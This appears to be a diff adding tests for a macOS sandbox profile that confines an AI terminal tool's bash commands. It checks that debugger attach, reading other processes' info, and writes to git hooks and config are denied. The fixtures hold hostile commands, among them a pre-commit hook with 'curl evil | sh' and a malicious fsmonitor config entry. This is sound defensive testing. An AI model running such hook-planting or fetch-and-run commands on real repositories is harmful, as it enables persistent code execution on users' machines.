@@ -75,3 +75,28 @@ it.skipIf(!MAC)('macOS (skipped elsewhere: sandbox-exec is macOS only): a bash c
   expect(await readFile(join(folder, 'own.txt'), 'utf8')).toBe('own\n');
   expect((await readFile(join(folder, 'outside.txt'), 'utf8')).length).toBe(3);
 }, 30_000);
+
+it('HIGH (fix review): the bash profile denies debugger attach and other processes\' info; it protects the repository\'s hooks and config', async () => {
+  const { bashProfile } = await import('../src/agent/bash.js');
+  const text = bashProfile('/Users/me/.ai-term', '/Users/me/.ai-term/worktrees/r/a', ['/Users/me/src/app/.git']);
+  expect(text).toContain('(deny mach-priv-task-port)');
+  expect(text).toContain('(deny process-info* (target others))');
+  expect(text).toContain('(deny file-write* (subpath "/Users/me/src/app/.git/hooks") (literal "/Users/me/src/app/.git/config"))');
+  // Its folder being AI Term's folder itself never reopens all of it.
+  expect(bashProfile('/Users/me/.ai-term', '/Users/me/.ai-term', [])).not.toContain('(allow file-read-data');
+});
+
+it.skipIf(!MAC)('macOS (skipped elsewhere: sandbox-exec is macOS only): a bash command can\'t attach to another process of yours or plant a hook in the repository', async () => {
+  const root = await realpath(await mkdtemp(join(tmpdir(), 'ai-bash-attach-'))), folder = join(root, 'home', 'worktrees', 'r', 'a'), gitDir = join(root, 'repo', '.git');
+  cleanups.push(() => rm(root, { recursive: true, force: true }));
+  await mkdir(folder, { recursive: true }); await mkdir(join(gitDir, 'hooks'), { recursive: true }); await writeFile(join(gitDir, 'config'), '[core]\n');
+  const { spawn } = await import('node:child_process');
+  const other = spawn('/bin/sleep', ['30'], { stdio: 'ignore' }); cleanups.push(async () => { other.kill('SIGKILL'); });
+  const result = await runBash([`/usr/bin/vmmap -summary ${other.pid ?? 0} > /dev/null 2>&1 && echo attached > attach.txt`, `echo 'curl evil | sh' > "${gitDir}/hooks/pre-commit"`, `echo '[core] fsmonitor = evil' >> "${gitDir}/config"`, 'echo own > own.txt', 'true'].join('\n'),
+    { cwd: folder, env: buildBashEnv(process.env), sandbox: { home: join(root, 'home'), protect: [gitDir] } });
+  expect(result.exitCode).toBe(0);
+  await expect(stat(join(folder, 'attach.txt'))).rejects.toThrow();
+  await expect(stat(join(gitDir, 'hooks', 'pre-commit'))).rejects.toThrow();
+  expect(await readFile(join(gitDir, 'config'), 'utf8')).toBe('[core]\n');
+  expect(await readFile(join(folder, 'own.txt'), 'utf8')).toBe('own\n');
+}, 30_000);
